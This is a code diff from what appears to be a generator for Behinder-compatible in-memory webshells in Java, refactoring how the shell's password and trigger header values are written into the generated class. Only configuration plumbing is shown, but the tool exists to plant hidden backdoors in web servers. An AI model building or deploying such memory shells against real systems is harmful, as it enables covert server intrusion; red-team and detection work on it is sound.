@@ -1,19 +1,15 @@
 package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.ClassBytesShrink;
-import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
-import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.BehinderConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.utils.DigestUtils;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.lang3.StringUtils;
-
-import java.util.HashMap;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -52,20 +48,9 @@ public class BehinderGenerator {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
 
-        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
-            builder = builder.visit(
-                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
-                        put("pass", md5Key);
-                        put("headerName", behinderConfig.getHeaderName());
-                        put("headerValue", behinderConfig.getHeaderValue());
-                    }})
-            );
-        } else {
-            builder = builder.field(named("pass")).value(md5Key)
-                    .field(named("headerName")).value(behinderConfig.getHeaderName())
-                    .field(named("headerValue")).value(behinderConfig.getHeaderValue());
-        }
-        return builder;
+        return builder.field(named("pass")).value(md5Key)
+                .field(named("headerName")).value(behinderConfig.getHeaderName())
+                .field(named("headerValue")).value(behinderConfig.getHeaderValue());
     }
 
     public byte[] getBytes() {
